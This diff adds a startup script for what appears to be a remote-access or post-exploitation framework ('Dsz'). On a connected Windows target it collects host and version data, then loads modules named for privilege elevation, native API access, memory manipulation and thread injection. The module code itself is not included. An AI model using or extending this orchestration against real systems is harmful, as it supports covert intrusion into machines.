@@ -1,0 +1,82 @@
+@include "_CommandModification.dsi";
+@include "_VersionChecks.dsi";
+@echo off;
+
+string $arch, $os;
+_GetArch($arch);
+_GetOsFamily($os);
+
+string $dataPath;
+_GetLpProjectsDirectories($dataPath);
+
+`script _GetTimeInfo.dss`;
+
+@echo on;
+`version`;
+@echo off;
+
+# get the installed tool versions
+`python _GetToolVersions.pyo`;
+
+# get the current remote directory so that virtual directories work
+`pwd`;
+
+_CheckForCommandModifications();
+
+echo "--------------------------------------------------\n";
+
+bool $rtn = true;
+
+if (!`script Connected/winnt/_Mcl_NtElevation.dss -project Dsz`)
+{
+	$rtn = false;
+}
+if (!`script Connected/winnt/_Mcl_NtNativeApi.dss -project Dsz`)
+{
+	$rtn = false;
+}
+if (!`script Connected/winnt/_Mcl_NtMemory.dss -project Dsz`)
+{
+	$rtn = false;
+}
+if (!`script Connected/winnt/_Mcl_ThreadInject.dss -project Dsz`)
+{
+	$rtn = false;
+}
+
+# get local host information so that IP_# variables are setup
+`script _GetHostInfo.dss -project Dsz`;
+
+# look for _Startup scripts for other projects
+int $i = sizeof($dataPath);
+while( $i > 0 ) {
+	$i--;
+	if (!RunScriptIfAvailable("$dataPath[$i]/Scripts/_Startup.dss"))
+	{
+		$rtn = false;
+	}
+}
+
+# look for Startup scripts for other projects
+$i = sizeof($dataPath);
+while( $i > 0 ) {
+	$i--;
+	if (!RunScriptIfAvailable("$dataPath[$i]/Scripts/Startup.dss"))
+	{
+		$rtn = false;
+	}
+}
+
+return $rtn;
+
+#---------------------------------------------------------------------------
+Sub RunScriptIfAvailable(IN string $script)
+{
+	if (!FileCheck($script))
+	{
+		return true;
+	}
+	
+	return `script $script`;
+	
+}
